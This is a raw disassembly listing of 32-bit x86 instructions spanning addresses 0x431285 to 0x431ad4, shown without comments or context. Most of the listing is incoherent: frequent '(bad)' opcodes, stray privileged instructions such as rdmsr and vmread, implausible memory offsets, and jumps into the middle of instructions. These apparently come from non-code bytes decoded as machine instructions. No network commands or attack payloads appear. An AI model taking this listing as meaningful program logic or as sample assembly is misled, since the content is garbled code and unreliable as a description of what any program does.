  431285:	fdivr  st,st(7)
  431287:	out    dx,eax
  431288:	rcl    BYTE PTR [ebx],0x66
  43128b:	mov    DWORD PTR [ebp-0xc70075],eax
  431291:	(bad)  
  431292:	std    
  431293:	cmp    eax,DWORD PTR [eax]
  431295:	jne    0x4312fd
  431297:	mov    DWORD PTR [ebp-0xba0048],eax
  43129d:	in     al,dx
  43129e:	outs   dx,BYTE PTR ds:[esi]
  43129f:	pushf  
  4312a0:	add    BYTE PTR [ebx-0x7f7a039a],cl
  4312a6:	inc    DWORD PTR [ecx]
  4312a8:	inc    DWORD PTR [eax]
  4312aa:	jae    0x4312e4
  4312ac:	add    BYTE PTR [ebp+0x850266],al
  4312b2:	inc    DWORD PTR [ebp-0x1]
  4312b5:	mov    eax,eax
  4312b7:	jl     0x43131f
  4312b9:	add    BYTE PTR [ebp-0x740077],al
  4312bf:	cld    
  4312c0:	dec    eax
  4312c1:	add    BYTE PTR [eax],0x1
  4312c4:	data16 add BYTE PTR [ebp+0x38],al
  4312c8:	mov    eax,0x47c2
  4312cd:	mov    eax,0x824f89
  4312d2:	inc    edi
  4312d3:	mov    DWORD PTR [edx+0x64],ebp
  4312d6:	inc    WORD PTR [ebp-0x75]
  4312da:	(bad)  
  4312db:	data16 rol BYTE PTR [ebp-0x16001a],1
  4312e2:	inc    ebp
  4312e3:	jge    0x4312c4
  4312e5:	add    bh,ah
  4312e7:	lea    ax,[ebp-0x750030]
  4312ee:	add    al,0x46
  4312f1:	jmp    0x40ff:0x8885
  4312f7:	push   DWORD PTR [ebp+0x52]
  4312fa:	lea    eax,[eax]
  4312fc:	shl    BYTE PTR [esi-0x7b],1
  4312ff:	test   esi,edi
  431301:	(bad)  
  431302:	(bad)  
  431303:	inc    DWORD PTR [ebp-0x990140]
  431309:	test   DWORD PTR [ebx+0x54fff4ff],ecx
  43130f:	inc    edi
  431310:	push   ecx
  431311:	xor    ax,WORD PTR [ebp-0x8d0045]
  431318:	add    al,al
  43131a:	ret    
  43131b:	mov    ax,WORD PTR [ebp-0x3f0004]
  431322:	push   eax
  431323:	mov    DWORD PTR [ebp-0x77],0xff98748b
  43132a:	add    BYTE PTR [ebx-0x764f8839],al
  431330:	push   DWORD PTR [esi+0x1]
  431333:	inc    DWORD PTR [eax]
  431335:	mov    eax,0xff99ff
  43133a:	or     BYTE PTR [ecx-0x7a87bb],cl
  431340:	jne    0x4312fa
  431342:	add    DWORD PTR [edx-0x76edff71],0xff707a8e
  43134c:	mov    ecx,0xd74fb8
  431351:	add    cl,al
  431353:	mov    DWORD PTR [ecx-0x3f007784],ecx
  431359:	or     DWORD PTR [ebx+0x558966dc],0x7e
  431360:	(bad)  
  431361:	push   ebp
  431363:	mov    eax,0x8c2789
  431368:	ret    0x6689
  43136b:	adc    BYTE PTR [ebp+0x48],0x8d
  43136f:	add    bh,ah
  431371:	mov    WORD PTR [ebp-0x70],ax
  431375:	(bad)  
  431376:	ret    0x667d
  431379:	or     BYTE PTR [ebp-0x77],dl
  43137c:	lea    eax,[ecx+eiz*8-0x6b1276bb]
  431383:	loop   0x43130e
  431385:	(bad)  
  431386:	xchg   esi,eax
  431387:	aam    0xcf
  431389:	out    dx,al
  43138a:	mov    DWORD PTR [esi-0x68],edi
  43138d:	inc    ebp
  43138e:	dec    edx
  43138f:	pop    ecx
  431390:	mov    edx,DWORD PTR [eax]
  431392:	repnz push bp
  431395:	or     BYTE PTR [ebx+0x55106638],0x49
  43139c:	(bad)  
  43139d:	repnz xor eax,0xa0898945
  4313a3:	mov    ah,0x89
  4313a5:	jmp    DWORD PTR [edx+0x66b0418d]
  4313ab:	inc    DWORD PTR [ebp+0x50]
  4313ae:	add    DWORD PTR [ebp-0x5],0xffffffbe
  4313b2:	mov    DWORD PTR [eax],ecx
  4313b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4313b5:	pop    es
  4313b6:	inc    ecx
  4313b7:	(bad)  
  4313b8:	data16 fwait
  4313ba:	inc    ebp
  4313bb:	xor    ah,BYTE PTR [esi+0x3]
  4313be:	dec    ebp
  4313bf:	push   eax
  4313c0:	inc    bp
  4313c2:	jge    0x431347
  4313c4:	mov    esp,DWORD PTR [esi-0x18]
  4313c7:	mov    esi,DWORD PTR [edi+0x7d809cfc]
  4313cd:	add    DWORD PTR [ebx],esi
  4313cf:	add    BYTE PTR [ebx],al
  4313d1:	test   DWORD PTR [ebx],esi
  4313d3:	(bad)  
  4313d4:	inc    WORD PTR [ebp+0x0]
  4313d8:	mov    eax,DWORD PTR [eax]
  4313da:	call   0x8898cb0f
  4313df:	mov    esi,eax
  4313e1:	clc    
  4313e2:	ret    
  4313e3:	rol    cl,0xa
  4313e6:	mov    DWORD PTR ds:0x7c0ec88,esi
  4313ec:	mov    edx,edi
  4313ee:	pushf  
  4313ef:	pop    es
  4313f0:	jmp    FWORD PTR [edx+0x66]
  4313f3:	add    BYTE PTR [ebp-0x990175],al
  4313f9:	inc    ebp
  4313fa:	test   DWORD PTR [ebx-0x2f00f202],eax
  431400:	push   ebp
  431401:	mov    edi,eax
  431403:	mov    dh,BYTE PTR [eax+0x266ff51]
  431409:	push   ebp
  43140a:	add    BYTE PTR [ebx-0x764b0777],al
  431410:	dec    DWORD PTR [esi+0x661851e8]
  431416:	add    BYTE PTR [ebp-0x7b],dl
  431419:	cmp    esi,0xfffffffb
  43141c:	dec    DWORD PTR [ecx+0x51fe9285]
  431422:	jmp    DWORD PTR [esi-0x75]
  431425:	push   ebp
  431426:	hlt    
  431427:	data16 (bad) 
  431429:	dec    ebp
  43142a:	ret    
  43142b:	mov    ecx,DWORD PTR [ebp-0xb29b9a]
  431431:	lea    edx,[eax-0x1]
  431434:	jne    0x431407
  431436:	dec    DWORD PTR [ecx-0x2f7a63f8]
  43143c:	dec    BYTE PTR [ecx+0x51559eff]
  431442:	mov    DWORD PTR [esi-0x4c],esp
  431445:	push   ebp
  431446:	jmp    DWORD PTR [esi-0x18]
  431449:	inc    ebp
  43144a:	sbb    BYTE PTR [ebp-0x767ad900],cl
  431450:	(bad)  
  431451:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  431452:	inc    eax
  431454:	test   DWORD PTR [esi-0x2],esp
  431457:	inc    ebp
  431458:	dec    DWORD PTR [ebp-0x760bde75]
  43145e:	(bad)  
  43145f:	test   al,0xc3
  431461:	mov    DWORD PTR [ebp-0x769b56],ecx
  431467:	lods   al,BYTE PTR ds:[esi]
  431468:	push   eax
  431469:	inc    ebp
  43146a:	jne    0x43147b
  43146c:	dec    DWORD PTR [ebp+0x8]
  43146f:	mov    ecx,DWORD PTR [ebx]
  431471:	sbb    al,0x0
  431473:	(bad)  
  431474:	mov    eax,0xc14fc3
  431479:	mov    DWORD PTR [ecx-0xbabf64],ecx
  43147f:	movsx  ecx,WORD PTR [ebp+0x4e]
  431483:	xor    eax,DWORD PTR [eax]
  431485:	add    eax,edi
  431487:	xor    ecx,DWORD PTR [ecx-0xbabd9a]
  43148d:	xor    edi,DWORD PTR [eax+0x854f66]
  431493:	dec    BYTE PTR [ecx-0x76bb01]
  431499:	mov    BYTE PTR [ebx-0x76724001],al
  43149f:	pushf  
  4314a0:	inc    esi
  4314a1:	(bad)  
  4314a2:	dec    DWORD PTR [ebp-0x7abe6373]
  4314a8:	sar    esi,0x89
  4314ab:	dec    DWORD PTR [eax+0x0]
  4314ae:	inc    DWORD PTR [eax]
  4314b0:	add    DWORD PTR [ebp-0x2f01cb],0xffffff89
  4314b7:	xlat   BYTE PTR ds:[ebx]
  4314b8:	dec    edx
  4314b9:	add    bh,bh
  4314bb:	mov    DWORD PTR [ebp-0x3e00ac48],ecx
  4314c1:	lea    esp,[esi-0x50]
  4314c4:	(bad)  
  4314c5:	(bad)  
  4314c6:	call   DWORD PTR [eax-0x1]
  4314c9:	inc    ebp
  4314ca:	rdpmc  
  4314cc:	add    BYTE PTR [ebx],al
  4314ce:	push   ax
  4314d0:	lea    eax,[ebp-0x1]
  4314d6:	js     0x4314d7
  4314d8:	add    al,bh
  4314da:	push   bp
  4314dc:	lea    ecx,[ebp-0x7701]
  4314e2:	fmul   DWORD PTR [ebp-0x7a997800]
  4314e8:	(bad)  
  4314e9:	(bad)  
  4314ea:	(bad)  
  4314eb:	(bad)  
  4314ec:	jmp    DWORD PTR [ecx-0x7676ffb3]
  4314f2:	dec    eax
  4314f3:	mov    eax,0x8d8dffff
  4314f8:	mov    al,0xb0
  4314fa:	(bad)  
  4314fb:	call   DWORD PTR [ecx+0x50]
  4314fe:	dec    ebp
  4314ff:	inc    ebp
  431500:	mov    esi,0x7030833
  431505:	push   eax
  431506:	into   
  431507:	test   DWORD PTR [ebx+0x3ff32ff],ebx
  43150d:	call   DWORD PTR [ecx-0x8]
  431510:	lea    edx,[ebp-0x1]
  431513:	jmp    0x761717
  431518:	inc    eax
  431519:	jnp    0x4314a8
  43151b:	add    dh,bh
  43151d:	inc    WORD PTR [ebp-0x8a00b0]
  431524:	mov    edx,eax
  431526:	inc    esp
  431527:	add    bh,bh
  431529:	mov    ecx,DWORD PTR [ecx-0x7a4f9a]
  43152f:	dec    DWORD PTR [ebx-0x7f820301]
  431535:	add    BYTE PTR [ecx],al
  431537:	data16 add BYTE PTR [ebp-0xb30077],al
  43153e:	inc    eax
  431540:	(bad)  
  431541:	dec    si
  431543:	test   edi,edi
  431545:	(bad)  
  431546:	cmp    edi,edi
  431548:	add    ecx,DWORD PTR [edi-0x39]
  43154b:	mov    edx,DWORD PTR [edx+0x66]
  43154e:	inc    DWORD PTR [ebp-0x3d00cb]
  431554:	mov    eax,0x66ff8b5e
  43155a:	jmp    0xb4ff:0xc7ff3895
  431561:	push   ecx
  431562:	inc    DWORD PTR [ebx-0x76ffccbb]
  431568:	call   DWORD PTR [esi-0x1]
  43156b:	dec    DWORD PTR [eax]
  43156d:	mov    ecx,0x805ff
  431572:	inc    ebp
  431573:	mov    DWORD PTR [ebx-0x3f00e3a8],ecx
  431579:	mov    ecx,0x35784
  43157e:	add    BYTE PTR [ecx-0xffa59b],cl
  431584:	inc    ebp
  431585:	mov    ecx,0x9c6131
  43158a:	(bad)  
  43158b:	mov    eax,ebx
  43158d:	pop    esp
  43158e:	test   edi,edi
  431590:	clc    
  431591:	lea    eax,[ebp-0x24]
  431594:	cmp    eax,0xc7fe9c8d
  431599:	push   eax
  43159b:	lea    eax,[ebp+0x45fff8fe]
  4315a1:	mov    esi,DWORD PTR [ecx]
  4315a3:	hlt    
  4315a4:	lahf   
  4315a5:	push   esp
  4315a6:	mov    edx,DWORD PTR [ecx-0x4]
  4315a9:	xor    eax,DWORD PTR [eax+0x7201bb]
  4315af:	add    BYTE PTR [ebp-0x35],al
  4315b2:	mov    ecx,DWORD PTR [ebp-0xb2bf04]
  4315b8:	mov    edx,DWORD PTR [ecx-0x74]
  4315bb:	rol    BYTE PTR [eax],0x8d
  4315be:	mov    eax,DWORD PTR [ebx+ecx*4-0x1]
  4315c2:	nop
  4315c3:	push   ecx
  4315c4:	add    bh,bh
  4315c6:	mov    esp,edi
  4315c8:	in     al,0x85
  4315ca:	jge    0x4315ca
  4315cc:	test   edi,edi
  4315ce:	jne    0x431555
  4315d0:	(bad)  
  4315d1:	(bad)  
  4315d2:	sbb    bh,bh
  4315d4:	push   ebp
  4315d5:	inc    ebp
  4315d6:	call   0xffdc1066
  4315db:	add    BYTE PTR [ebp+0x66],al
  4315de:	mov    edx,DWORD PTR [ebp-0xfc0075]
  4315e4:	cmp    al,0x85
  4315e6:	ud0    eax,DWORD PTR [ebp-0x1]
  4315ea:	test   DWORD PTR [edi+0x74],ecx
  4315ed:	dec    edi
  4315ee:	inc    DWORD PTR [ebp-0x530004]
  4315f4:	dec    DWORD PTR [edi-0x75]
  4315f7:	dec    esi
  4315f8:	cld    
  4315f9:	test   DWORD PTR [eax+0xff01ff],eax
  4315ff:	icebp  
  431600:	add    BYTE PTR [edi-0x3a],cl
  431603:	test   ebx,eax
  431605:	inc    BYTE PTR [ebp-0x1]
  431608:	jne    0x43160a
  43160a:	mov    eax,DWORD PTR [eax]
  43160c:	cld    
  43160d:	xor    BYTE PTR [ecx+0x500155],cl
  431613:	push   ebp
  431614:	xor    DWORD PTR [ecx+0x45011c80],ecx
  43161a:	add    BYTE PTR [ebp+0x35e90f50],al
  431620:	add    al,BYTE PTR [eax]
  431622:	add    BYTE PTR [ebx-0x38fe4f80],al
  431628:	add    ah,ch
  43162a:	or     BYTE PTR [ebp+0x4501f845],dh
  431630:	jmp    0xdf1926
  431635:	(bad)  
  431636:	nop    ecx
  431639:	test   DWORD PTR [ebp+0x4502f8],eax
  43163f:	xor    ecx,DWORD PTR [ebp-0x64]
  431642:	mov    eax,edi
  431644:	mov    ebx,DWORD PTR [eax+edx*2]
  431647:	add    eax,0x45fef885
  43164c:	dec    DWORD PTR [ebx+0x339445]
  431652:	add    ecx,DWORD PTR [ecx+0x4500f889]
  431658:	dec    DWORD PTR [ebx-0x460f0375]
  43165e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43165f:	add    esi,edi
  431661:	add    bh,bh
  431663:	rdpmc  
  431665:	add    BYTE PTR [ebx],0x1
  431668:	mov    DWORD PTR [eax],eax
  43166a:	add    al,0x45
  43166c:	dec    DWORD PTR [ecx-0x360b3373]
  431672:	dec    DWORD PTR [esi]
  431674:	push   eax
  431675:	jne    0x4316bc
  431677:	mov    esi,DWORD PTR [ebx]
  431679:	cld    
  43167a:	add    esp,ecx
  43167c:	push   eax
  43167d:	inc    DWORD PTR [ebp-0x75]
  431680:	add    eax,0x800e4
  431685:	add    BYTE PTR [ebx-0x7f7403bf],cl
  43168b:	mov    DWORD PTR [ecx],eax
  43168d:	sbb    al,0x0
  43168f:	leave  
  431690:	test   DWORD PTR [edi-0x2],eax
  431693:	jne    0x431694
  431695:	call   0xff44009a
  43169a:	xor    BYTE PTR [ebp+0x4d],al
  43169d:	mov    edi,edi
  43169f:	enter  0x8,0x4d
  4316a3:	mov    ecx,DWORD PTR [ebx-0x7fc74cd]
  4316a9:	mov    eax,DWORD PTR [eax]
  4316ab:	cld    
  4316ac:	add    DWORD PTR [ecx],ebx
  4316ae:	inc    ebp
  4316af:	dec    ebp
  4316b0:	mov    DWORD PTR [ebx+0x1ccc8b],ecx
  4316b6:	inc    eax
  4316b7:	dec    DWORD PTR [ecx-0x270375]
  4316bd:	add    BYTE PTR [ebx-0x39d72701],cl
  4316c3:	xchg   ecx,eax
  4316c4:	ret    
  4316c5:	add    BYTE PTR [ebp-0x830075],al
  4316cb:	add    BYTE PTR [ebp-0x75],al
  4316ce:	mov    DWORD PTR [ebp+0x8ff0404],ecx
  4316d4:	lea    edi,[edi-0xc]
  4316d7:	add    bh,bh
  4316d9:	mov    edx,DWORD PTR [eax-0x7b]
  4316dc:	inc    ebp
  4316dd:	rdpmc  
  4316df:	jne    0x4316e4
  4316e1:	add    BYTE PTR [eax-0x75],dl
  4316e4:	inc    ebp
  4316e5:	clc    
  4316e6:	add    eax,0x400009
  4316eb:	mov    DWORD PTR [ebx-0x7f000304],ecx
  4316f1:	mov    eax,DWORD PTR [ecx]
  4316f3:	in     al,dx
  4316f4:	add    dh,al
  4316f6:	test   ebx,eax
  4316f8:	inc    BYTE PTR [ebp-0xff0001]
  4316fe:	add    BYTE PTR [ebp-0x43],al
  431701:	cmp    esi,0xfffffff8
  431704:	(bad)  
  431705:	push   DWORD PTR [eax]
  431707:	add    BYTE PTR [ebp-0x3a],dl
  43170a:	test   ebx,eax
  43170c:	je     0x431693
  43170e:	mov    edi,edi
  431710:	sbb    al,0xff
  431712:	test   DWORD PTR gs:[eax],eax
  431715:	(bad)  
  431716:	js     0x431717
  431718:	add    BYTE PTR [ebx-0x39b20bdd],cl
  43171e:	sub    eax,ebx
  431720:	mov    ecx,DWORD PTR [ebx-0x55130377]
  431726:	add    eax,DWORD PTR [eax]
  431728:	dec    ebp
  431729:	push   eax
  43172a:	mov    al,BYTE PTR [ebp+0x1]
  43172d:	mov    eax,DWORD PTR [ebp-0x68]
  431730:	mov    eax,DWORD PTR [eax]
  431732:	sbb    bh,al
  431734:	or     ah,dh
  431736:	dec    ebp
  431737:	inc    DWORD PTR [eax+0x4]
  43173a:	push   ecx
  43173b:	add    BYTE PTR [edx-0x1],dh
  43173e:	mov    ecx,DWORD PTR [ecx+0x55cfe83c]
  431744:	or     DWORD PTR [ebx-0x7ff3400],0x8b5545d7
  43174e:	add    ecx,DWORD PTR [ecx-0x1be77477]
  431754:	push   ecx
  431755:	cmp    BYTE PTR [ebx],al
  431757:	inc    ebp
  431758:	mov    DWORD PTR [ebx-0x7aaaafe4],ecx
  43175e:	(bad)  
  43175f:	(bad)  
  431760:	in     al,0xff
  431762:	add    BYTE PTR [ebp+0x0],al
  431765:	xor    eax,DWORD PTR [eax-0x7c76fffd]
  43176b:	add    al,bh
  43176d:	(bad)  
  43176e:	jmp    0x8d85:0x74b0558d
  431775:	dec    DWORD PTR [eax]
  431777:	call   DWORD PTR [ebp-0x7b]
  43177a:	mov    edi,esi
  43177c:	lock call DWORD PTR [ebp-0x75]
  431780:	mov    esi,esp
  431782:	mov    ah,0xc6
  431784:	mov    bh,0xc3
  431786:	mov    DWORD PTR [ebx-0x110003c4],ecx
  43178c:	add    DWORD PTR [eax],0x450050ff
  431792:	mov    DWORD PTR [ebx+0x9598cc],ecx
  431798:	inc    edi
  43179a:	push   esp
  43179c:	jmp    0xcd00:0x650481ff
  4317a3:	mov    DWORD PTR [ebx],esi
  4317a5:	clc    
  4317a6:	cmp    edi,0xff9cff3c
  4317ac:	jne    0x4317b6
  4317ae:	mov    eax,eax
  4317b0:	add    esi,DWORD PTR [eax]
  4317b2:	int3   
  4317b3:	inc    ebp
  4317b4:	cmp    al,0x83
  4317b6:	add    BYTE PTR [eax],bl
  4317b8:	adc    DWORD PTR [ebx+0x768b5055],eax
  4317be:	add    ecx,DWORD PTR [ebx-0x30ba17c7]
  4317c4:	mov    edi,eax
  4317c6:	cmp    BYTE PTR [ebp+0x45],cl
  4317c9:	jmp    0x431756
  4317cb:	mov    ebx,DWORD PTR [esp+ebp*8]
  4317ce:	inc    ebp
  4317cf:	or     al,0x2
  4317d1:	dec    DWORD PTR [ebp+0x18]
  4317d4:	jne    0x43182b
  4317d6:	mov    ecx,DWORD PTR [eax+0x1c558bf8]
  4317dc:	mov    edi,DWORD PTR [ebx]
  4317de:	in     al,0x50
  4317e0:	xchg   ecx,eax
  4317e1:	jmp    0x34366e6
  4317e6:	adc    al,0x8b
  4317e8:	inc    ebp
  4317e9:	mov    al,ds:0x8b04008b
  4317ee:	push   ebp
  4317ef:	sub    ecx,DWORD PTR [ecx-0x2d381318]
  4317f5:	push   ebp
  4317f6:	test   DWORD PTR [ebx-0x2800d701],ecx
  4317fc:	inc    ebp
  4317fd:	dec    ebp
  4317fe:	mov    DWORD PTR [ecx+0x45ffb8f8],ecx
  431804:	mov    DWORD PTR [eax],0xe9ff00f4
  43180a:	add    al,0x0
  43180c:	add    BYTE PTR [eax],al
  43180e:	mov    eax,edx
  431810:	push   eax
  431811:	rol    DWORD PTR [ebp-0xf0177],1
  431817:	bound  eax,QWORD PTR [ebp+0x50]
  43181a:	xor    ecx,DWORD PTR [ecx+0x5589b403]
  431820:	add    BYTE PTR [ecx+0x558df0ff],cl
  431826:	mov    al,0xf
  431828:	test   DWORD PTR [edx],edx
  43182a:	call   DWORD PTR [ebp-0x7a0001]
  431830:	(bad)  
  431831:	loop   0x431832
  431833:	jnp    0xc6990c39
  431839:	mov    eax,ebx
  43183b:	cmp    al,0x8b
  43183d:	(bad)  
  43183e:	cld    
  43183f:	shr    esi,0xc
  431842:	add    dl,al
  431844:	push   eax
  431845:	lea    eax,[ebp-0x1]
  431848:	mov    edx,esi
  43184a:	cwde   
  43184b:	cli    
  43184c:	add    BYTE PTR [ebp+0x1ffff8ff],al
  431852:	or     BYTE PTR [eax],cl
  431854:	inc    ebp
  431855:	dec    ebp
  431856:	inc    DWORD PTR [ebx+0x74803914]
  43185c:	add    DWORD PTR [ebx+0x451800],ecx
  431862:	call   DWORD PTR [eax+edx*1]
  431865:	add    ecx,DWORD PTR [ebp-0x34]
  431868:	push   edi
  431869:	adc    al,0x8
  43186b:	mov    edx,DWORD PTR [ebp-0x14]
  43186e:	mov    ecx,DWORD PTR [ebp+0x18]
  431871:	add    DWORD PTR [ebp-0x4c],0xffffff8d
  431875:	inc    DWORD PTR [eax+esi*8]
  431878:	inc    ebp
  431879:	stos   BYTE PTR es:[edi],al
  43187a:	mov    edx,DWORD PTR [ebp-0x4]
  43187d:	add    DWORD PTR [ebp-0x1c],eax
  431880:	mov    edx,DWORD PTR [ebp-0x70]
  431883:	cmp    eax,DWORD PTR [eax]
  431885:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  431886:	mov    eax,DWORD PTR [eax]
  431888:	cld    
  431889:	jae    0x43180b
  43188b:	add    eax,DWORD PTR [ecx]
  43188d:	clc    
  43188e:	add    BYTE PTR [eax+0x30],dl
  431891:	mov    DWORD PTR [ecx],esi
  431893:	clc    
  431894:	pop    ds
  431895:	inc    ebp
  431896:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  43189c:	(bad)  
  43189d:	push   DWORD PTR [edi]
  43189f:	mov    ecx,DWORD PTR [ebx+0x398503e8]
  4318a5:	(bad)  
  4318a6:	jae    0x4318a7
  4318a8:	mov    eax,DWORD PTR [ebp-0x740175]
  4318ae:	sub    eax,DWORD PTR [eax]
  4318b0:	add    eax,DWORD PTR [eax]
  4318b2:	mov    DWORD PTR [ecx+0x5f],eax
  4318b5:	mov    DWORD PTR [ebx-0x4],ebx
  4318b8:	ret    0xff
  4318bb:	mov    ecx,DWORD PTR [ebx+0x1cc683d8]
  4318c1:	ret    
  4318c2:	mov    eax,DWORD PTR [ebp-0x6f0075]
  4318c8:	add    BYTE PTR [ebp-0x7d],al
  4318cb:	mov    DWORD PTR [eax],eax
  4318cd:	add    al,0x84
  4318cf:	inc    DWORD PTR [ecx]
  4318d1:	lea    eax,[eax]
  4318d3:	hlt    
  4318d4:	sar    bh,cl
  4318d6:	test   BYTE PTR [eax+0x1],dl
  4318d9:	inc    ebp
  4318da:	add    BYTE PTR [ebx],dh
  4318dc:	test   BYTE PTR [ebx],0x84
  4318df:	push   eax
  4318e0:	add    BYTE PTR [ebp+0x0],al
  4318e3:	add    eax,0x86
  4318e8:	add    BYTE PTR [ebx-0x7f7b0340],cl
  4318ee:	add    BYTE PTR [ecx],al
  4318f0:	add    BYTE PTR [eax],al
  4318f2:	mov    esi,0x550030
  4318f7:	mov    ecx,DWORD PTR [edi]
  4318f9:	cld    
  4318fa:	fidiv  DWORD PTR [ebp+0x0]
  4318fd:	mov    edi,DWORD PTR [ecx]
  4318ff:	xor    BYTE PTR [eax+eax*1],0x84
  431903:	add    eax,DWORD PTR [eax]
  431905:	sbb    BYTE PTR [eax],al
  431907:	jne    0x4318ba
  431909:	mov    eax,DWORD PTR [ecx]
  43190b:	sbb    BYTE PTR [eax],al
  43190d:	mov    DWORD PTR [ebp-0x1],esp
  431910:	add    BYTE PTR [eax+0x30e45ca],bh
  431916:	ret    0xb7fc
  431919:	dec    ebp
  43191a:	or     al,0x89
  43191c:	dec    ebp
  43191d:	cld    
  43191e:	cmovne ecx,DWORD PTR [eax-0x75]
  431922:	add    edi,esp
  431924:	seto   BYTE PTR [esi-0x72ffffff]
  43192b:	inc    ebp
  43192c:	adc    al,0x8b
  43192e:	mov    DWORD PTR [eax+ebp*8-0x740100],ecx
  431935:	cmp    DWORD PTR [edi+0x72],edx
  431938:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  43193e:	gs cmp al,0x0
  431941:	je     0x431919
  431943:	push   eax
  431944:	sar    BYTE PTR [eax],1
  431946:	mov    bh,0x3e
  431948:	push   cs
  431949:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  43194f:	add    DWORD PTR [ecx+0x12],ebp
  431952:	dec    edx
  431953:	(bad)  
  431954:	mov    eax,edx
  431956:	in     al,dx
  431957:	adc    DWORD PTR [ecx],esi
  431959:	pop    esi
  43195a:	inc    ecx
  43195b:	leave  
  43195c:	or     DWORD PTR [eax],ebx
  43195e:	gs push ebp
  431960:	add    ah,ch
  431962:	into   
  431963:	in     al,dx
  431964:	enter  0xb756,0xf0
  431968:	push   cs
  431969:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  431973:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  431979:	jnp    0x74439e81
  43197f:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  431985:	add    BYTE PTR [edi],cl
  431987:	mov    edi,DWORD PTR [ecx-0x78]
  43198a:	ltr    WORD PTR [ecx-0x7b]
  43198e:	dec    DWORD PTR [edi]
  431990:	clc    
  431991:	out    0x45,eax
  431993:	add    BYTE PTR [eax],cl
  431995:	cmp    ebx,0xffffff8c
  431998:	jge    0x43199a
  43199a:	jb     0x4319ac
  43199c:	je     0x521a1c
  4319a2:	pop    edx
  4319a3:	push   esi
  4319a4:	mov    ecx,DWORD PTR [edi]
  4319a6:	in     al,dx
  4319a7:	rol    DWORD PTR [ebp+0x0],1
  4319aa:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  4319b1:	cmp    DWORD PTR [ecx],0xfffffff0
  4319b4:	hlt    
  4319b5:	mov    esp,DWORD PTR [eax+0xf034d2b]
  4319bb:	(bad)  
  4319bd:	push   eax
  4319be:	jns    0xb842fe3c
  4319c4:	lock push cs
  4319c6:	ror    edx,0x3
  4319c9:	test   BYTE PTR [ecx+0x5500e800],cl
  4319cf:	dec    eax
  4319d0:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  4319d4:	(bad)  
  4319d5:	mov    esi,0x7f33ff5f
  4319da:	inc    eax
  4319db:	test   DWORD PTR [edx],eax
  4319dd:	je     0x43199f
  4319df:	mov    ecx,ecx
  4319e1:	adc    DWORD PTR [ebp-0xc],0xffffffec
  4319e5:	and    eax,DWORD PTR [eax+0xf0103]
  4319eb:	jp     0x4319d9
  4319ed:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  4319f1:	add    edx,DWORD PTR [edi+0x74]
  4319f4:	sbb    BYTE PTR [ebp+0x4d001484],cl
  4319fa:	add    BYTE PTR [ebp-0x74c48bbb],al
  431a00:	je     0x431985
  431a02:	cmp    eax,edi
  431a04:	js     0x431a29
  431a06:	add    eax,0xeb0fc003
  431a0b:	jns    0x431998
  431a0d:	vmread DWORD PTR [ecx+0x45],ebx
  431a11:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  431a17:	adc    al,0x8b
  431a19:	jge    0x431a2f
  431a1b:	mov    edi,DWORD PTR [eax-0x4]
  431a1e:	add    edi,DWORD PTR [edi]
  431a20:	or     bh,bh
  431a22:	push   ebp
  431a23:	push   es
  431a24:	mov    DWORD PTR [ebp-0x4],ebx
  431a27:	add    edi,esi
  431a29:	pop    es
  431a2a:	add    esi,DWORD PTR [edi-0x48ccf183]
  431a30:	mov    DWORD PTR [esp+esi*8],ecx
  431a33:	inc    ebp
  431a34:	pop    ebp
  431a35:	xor    DWORD PTR [esi-0x4],0x3b
  431a39:	add    edx,DWORD PTR [ecx+edi*1]
  431a3c:	push   es
  431a3d:	clc    
  431a3e:	mov    bh,0xdb
  431a40:	jp     0x4319f9
  431a42:	add    cl,BYTE PTR [esi]
  431a44:	div    DWORD PTR [edi+0x4d8b0c1c]
  431a4a:	test   edi,edi
  431a4c:	je     0x431a42
  431a4e:	mov    eax,ecx
  431a50:	or     BYTE PTR [ebx],al
  431a52:	dec    BYTE PTR [ecx+0x7d3bec7d]
  431a58:	jbe    0x431acc
  431a5a:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  431a60:	add    ecx,DWORD PTR [esi]
  431a62:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  431a68:	add    eax,DWORD PTR [ebx-0x287af783]
  431a6e:	je     0x431abd
  431a70:	mov    DWORD PTR [ecx],edi
  431a72:	mov    esi,eax
  431a74:	hlt    
  431a75:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  431a7c:	jb     0x431a3e
  431a7e:	jmp    0x431a6b
  431a80:	xor    esi,DWORD PTR [ebx]
  431a82:	pop    edi
  431a83:	pop    esi
  431a84:	pop    ebx
  431a85:	ret    
  431a86:	ret    0x8b
  431a89:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  431a8f:	xor    DWORD PTR [ecx],0xc
  431a92:	pushf  
  431a93:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  431a99:	rdmsr  
  431a9b:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  431aa2:	dec    ebp
  431aa3:	ret    
  431aa4:	mov    edi,DWORD PTR [esi-0x4]
  431aa7:	pop    eax
  431aa8:	dec    ebp
  431aa9:	jne    0x431a36
  431aab:	xor    edi,esp
  431aad:	inc    eax
  431aae:	dec    ebp
  431aaf:	jbe    0x431b04
  431ab1:	inc    eax
  431ab2:	pop    ebp
  431ab3:	add    edx,DWORD PTR [esi+0x8]
  431ab6:	push   esp
  431ab7:	dec    eax
  431ab8:	push   ecx
  431ab9:	mov    eax,edi
  431abb:	and    al,0xf0
  431abd:	jo     0x431aaa
  431abf:	mov    eax,DWORD PTR [ebx]
  431ac1:	sbb    BYTE PTR [ebp+0x4d],cl
  431ac4:	mov    eax,DWORD PTR [ebx]
  431ac6:	nop
  431ac7:	or     BYTE PTR [eax],al
  431ac9:	jne    0x431b22
  431acb:	cmp    ebx,DWORD PTR [ebx+0x33893277]
  431ad1:	cld    
  431ad2:	xor    edi,edi
  431ad4:	add    edi,DWORD PTR [ebp+0x3]
